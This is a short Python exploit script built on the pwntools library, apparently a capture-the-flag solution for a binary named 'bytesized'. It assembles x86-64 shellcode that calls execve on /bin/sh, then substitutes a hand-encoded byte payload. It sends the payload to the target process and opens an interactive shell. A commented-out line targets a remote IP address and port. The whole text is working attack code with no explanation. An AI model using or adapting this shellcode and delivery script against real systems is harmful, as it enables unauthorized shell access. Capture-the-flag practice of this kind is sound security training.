from pwn import *

io = process("./bytesized")
#io = remote("15.206.149.154", 30012)
context.log_level = 'debug' 
context.arch = "amd64"

payload = asm('''mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
    .string "/bin/sh"
''')
payload = b'\x61\xf0\x80\x98\x5f\x5f\xa3\x98\x98\x5f\x92\x99\x9e\xb9\xf1\x61\x02\xe0\x3b\xb9\x13\xfd\xb0'
io.recvuntil("es)==>\n")
io.sendline(payload)
io.interactive()
